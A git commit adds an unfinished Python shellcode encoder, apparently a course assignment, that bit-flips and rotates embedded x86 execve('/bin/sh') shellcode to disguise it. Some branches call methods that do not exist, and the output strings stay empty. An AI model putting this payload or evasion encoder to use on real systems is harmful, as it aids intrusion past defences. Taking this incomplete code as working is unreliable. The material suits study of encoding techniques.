7e8ef2687fd4411f80c46c1cb6980aad33e4abc0
edu <22789840+s4nkx0k@users.noreply.github.com>
2022-11-13 23:42:56 +0000

    shellbyte binary rotation

---
+++ assignments/4-Custom_Encoder_Decoder/flipRotation_Encoder.py
@@ -0,0 +1,181 @@
+#!/usr/bin/python3
+
+# Shellcode XOR, NOT byte Encoder
+
+# TODO
+#
+#1- option to generate new key with the same instanced object using a random key;
+#2- bad xor key byte - generate a key byte that is not present in the shellcode. this will result in a null byte and be the marker to stop the converting operation; 
+
+import argparse
+import secrets
+import logging
+import sys
+
+#parser = argparse.ArgumentParser(description='[*] Miscellaneous Shellcode Encoder.')
+#parser.add_argument('string', metavar='string', type=ascii, help='The string to be converted')
+
+#args = parser.parse_args()
+
+#logging.basicConfig(level=logging.DEBUG)
+logging.basicConfig(level=logging.INFO)
+
+secretsGenerator = secrets.SystemRandom()
+
+#c_style_shellcode = (b"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x2f\x2f\x2f\x2f\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80") # bin/bash - execve stack technique shellcode -> execve(/bin/bash,/bin/bash,0)
+
+c_style_shellcode = (b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80") # bin/sh
+
+#c_style_shellcode = b"\x31\xc1"
+
+def banner():
+
+    print('''
+        
+        _______________________________________________________
+         <The "XORCoder" - XOR your shellcode (encode/decode)>
+        -------------------------------------------------------
+            \   ^__^
+            \   (oo)\_______
+                (__)\       )\/\\
+                    ||----w |
+                    ||     ||       
+        
+         ''')
+
+#----------------------------
+
+
+class Encoder:
+
+    def randomKeyGenerator(self):
+        byte = '0x'
+        for i in range(2):
+            hexDigits = [0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0a,0x0b,0x0c,0x0d,0x0e,0x0f]
+            nibble = secretsGenerator.choice(hexDigits) # it gets in decimal not hex format
+            #print("nibble----"+hex(nibble)[2:])
+            byte = byte + hex(nibble)[2:] # hex class is str type. Appending to 0x
+        #print(byte)
+        #chr(int(byte,16)) # converts from base 16 to integer (decimal) and then to ascii (chr func) 
+        #print(int(byte,16))
+        return int(byte,16) # convert key to bytes and return
+
+
+    def __init__(self,enc_type, key=None):
+        if enc_type != "not":
+            
+            if key is not None:
+                self.key = key
+                print("[*] Key Provided. Doing magic with it")
+            else:
+                self.key = self.randomKeyGenerator()
+                print("[*] Doing magic with a (pseudo) Random key")
+            print("[*] Key: "+hex(self.key))
+
+ 
+    # Function to left
+    # rotate n by d bits
+    def leftRotate(self,shellbits, d):
+        tmp = shellbits[d:] + shellbits[0:d]
+        return tmp
+    
+    # Function to right
+    # rotate n by d bits
+    def rightRotate(self, shellbits, d):
+        return self.leftRotate(shellbits, len(shellbits) - d)
+        
+   
+    
+    def insertion_encode(self, shellcode):
+
+        encoded = '' # 0x format
+        encoded2 = '' # \x format
+        rotation_counter = 0
+        for shellbyte in shellcode:
+            '''
+            logging.info("Shellbyte type - "+str(shellbyte))
+            encoded += hex(shellbyte) + ',' + hex(self.key)  + ','
+            '''
+
+            #encoded2 += '\\x' + hex(shellbyte)[2:] + '\\x' + hex(self.key)[2:] # \x format
+            
+            flipped_shellbyte = shellbyte ^ 0x01    # flip lowest bit
+            
+            print(flipped_shellbyte)
+            print(type(bin(flipped_shellbyte)))
+            print(bin(flipped_shellbyte))
+            print(bin(flipped_shellbyte)[2:])
+
+            if bin(flipped_shellbyte)[-1] == '0':
+                logging.info("Flipped byte - odd - "+str(flipped_shellbyte))
+                rotated_shellbyte = self.rightRotate(bin(flipped_shellbyte)[2:],rotation_counter)
+            else:
+                logging.info("Flipped byte - even - "+str(flipped_shellbyte))
+                rotated_shellbyte = self.leftRotate(bin(flipped_shellbyte)[2:],rotation_counter)
+
+            print("Rotated SHellbyte - "+rotated_shellbyte)
+            print(rotated_shellbyte)
+            print("--------------------")
+            rotation_counter += 1
+
+        print("\n[*] \\x format: ")
+        print(encoded2)
+            
+        print("\n[*] 0x format: ")
+        print(encoded[:-1])
+
+
+
+def main():
+   
+    shellcode = bytearray(c_style_shellcode)
+    print("[*] Shellcode length: "+str(len(shellcode))+"\n")
+    print("[*] Shellcode: "+str(c_style_shellcode)+"\n")
+
+    # -------------------KEY-------------- 
+    key = 0xff
+    #key = None
+    #####################################
+
+    # -------------Encode Type-----------
+    enc_type = "insertion"
+    #####################################
+
+    #if key is not None:
+     #   key = bytes.fromhex(key)
+      #  logging.debug(key)
+    
+    if enc_type == "not":
+
+        encoder = Encoder(enc_type)
+        encoder.complement_encoding(shellcode)
+
+    elif enc_type == "xor":
+    
+        encoder = Encoder(enc_type, key)
+        encoder.xor_encoding_backslashX(shellcode)# utf-8 encoding (\x4b,\xe4,...)
+        encoder.xor_encoding_0x(shellcode) # hex format (0x4b, 0xe4,...)
+    
+    elif enc_type == "insertion":
+        encoder = Encoder(enc_type, key)
+        encoder.insertion_encode(shellcode)
+           
+    else:
+        print("[*] Encode type not supported. Please check the supported algorithms in the help menu")
+        #sys.exit()
+
+
+
+
+
+
+if __name__ == '__main__':
+
+    banner() # displays the program banner
+    main()
+    print("\n--------------------")
+    print("[*] Hack the World!")
+    print("--------------------")
+    print()
+    print()
+
